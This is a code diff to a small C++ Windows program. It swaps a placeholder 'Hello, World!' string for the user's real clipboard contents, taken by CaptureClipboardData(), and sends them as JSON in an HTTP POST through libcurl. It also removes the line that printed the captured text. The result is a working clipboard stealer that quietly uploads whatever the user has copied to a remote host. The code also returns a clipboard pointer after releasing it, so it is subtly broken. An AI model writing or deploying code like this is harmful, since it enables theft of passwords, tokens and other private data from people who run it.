@@ -6,20 +6,19 @@
 #include <string>
 #include <curl/curl.h>
 
-wchar_t* CaptureClipboardData() {
+const wchar_t* CaptureClipboardData() {
 	// Open the clipboard
 	if (!OpenClipboard(NULL)) {
 		std::cerr << "Failed to open clipboard." << std::endl;
 		return NULL;
 	}
 
-	wchar_t* text = NULL;
+	const wchar_t* text = NULL;
 
-	HANDLE hData = GetClipboardData(CF_UNICODETEXT || CF_TEXT);
+	HANDLE hData = GetClipboardData(CF_UNICODETEXT);
 	if (hData != NULL) {
 		text = static_cast<wchar_t*>(GlobalLock(hData));
 		if (text != NULL) {
-			std::cout << "Text Data: " << text << std::endl;
 			GlobalUnlock(hData);
 		}
 	}
@@ -28,10 +27,6 @@ wchar_t* CaptureClipboardData() {
 	CloseClipboard();
 
 	return text;
-}
-
-const wchar_t* fc() {
-	return L"Hello, World! 🌍🚀😊";
 }
 
 std::string WStringToString(const std::wstring& wstr) {
@@ -60,7 +55,7 @@ int main() {
 		curl_easy_setopt(curl, CURLOPT_POST, 1L);
 
 		// Set POST fields
-		std::string body = WStringToString(fc());
+		std::string body = WStringToString(CaptureClipboardData());
 		std::string jsonData = R"({"content":")" + body + R"("})";
 		std::cout << jsonData << std::endl;
 		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
